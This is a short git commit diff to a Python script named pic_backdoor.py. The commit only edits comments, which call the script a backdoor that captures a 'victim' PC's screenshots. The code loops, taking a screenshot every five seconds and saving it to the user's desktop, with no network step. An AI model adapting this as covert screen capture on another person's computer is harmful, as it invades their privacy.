ae1d7c9d1063a62b55b7a7a40726caf9fac71e63
pressi <32235265+pressikid@users.noreply.github.com>
2017-10-01 07:59:54 -0700

    Update pic_backdoor.py

--- backdoor/pic_backdoor.py
+++ backdoor/pic_backdoor.py
@@ -1,4 +1,4 @@
-# cap the screen shot
+# capturing victim pc screenshot backdoor
 import pyscreenshot as Img
 import getpass
 from random import randint
@@ -6,10 +6,10 @@ import time
 def main():
 	while True:
 	     img =Img.grab()
-	     path="C:/Users/"+str(getpass.getuser())+"/Desktop/"
-	     savefile=path+str(randint(1,100))+".jpg"
+	     path="C:/Users/"+str(getpass.getuser())+"/Desktop/"#choose the path
+	     savefile=path+str(randint(1,100))+".jpg"#saving the image
 	     img.save(savefile)
-	     time.sleep(5)
+	     time.sleep(5)#making 5sec delay 
 
 
 if __name__ == "__main__":
